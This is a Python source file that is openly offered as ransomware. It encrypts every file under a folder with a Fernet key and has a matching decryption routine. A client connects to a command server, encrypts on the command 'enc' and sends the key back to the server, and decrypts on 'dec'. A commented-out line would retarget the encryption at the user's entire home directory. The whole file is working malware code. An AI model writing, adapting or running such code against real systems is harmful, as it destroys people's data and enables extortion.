import os
from cryptography.fernet import Fernet
import socket

def ransomware():
    key = Fernet.generate_key()

    f = Fernet(key)

    if os.name == "nt":
        # ATTENTION! This comment line encrypts all personal files. Do not try on your own computer.
        #main_folder = os.environ["HOMEDRIVE"]+os.environ["HOMEPATH"]

        main_folder = "folder" # This only encrypts the contents of the folder "folder".
    elif os.name == "posix":
        print("linux, mac")
    else:
        raise OSError("Operating system not recognized.")

    for root_directory, subdirectory, files in os.walk(main_folder):
        for file in files:
            path = os.sep.join([root_directory, file])

            with open(path, "rb") as data:
                encrypted_data = f.encrypt(data.read())
            with open(path, "wb") as data:
                data.write(encrypted_data)
    return key

def ransomware_solver(key):
    f = Fernet(key)

    if os.name == "nt":
        # ATTENTION! This comment line encrypts all personal files. Do not try on your own computer.
        # main_folder = os.environ["HOMEDRIVE"]+os.environ["HOMEPATH"]

        main_folder = "folder"  # This only encrypts the contents of the folder "folder".
    elif os.name == "posix":
        print("linu, mac")
    else:
        raise OSError("Operating system not recognized.")

    for root_directory, subdirectory, files in os.walk(main_folder):
        for file in files:
            path = os.sep.join([root_directory, file])
            with open(path, "rb") as data:
                decrypted_data = f.decrypt(data.read())
            with open(path, "wb") as data:
                data.write(decrypted_data)

def client():
    HOST = "127.0.0.1"
    PORT = 65432

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((HOST, PORT))
        while True:
            x = s.recv(1024)
            if not x:
                continue

            if x == b"enc":
                key = ransomware()
                s.sendall(key)
                key = None
            elif x == b"dec":
                while True:
                    key = s.recv(1024)
                    if not x:
                        continue
                    break
                ransomware_solver(key)
            elif x == b"close": break
            elif x == b"exit": break

            x = None


client()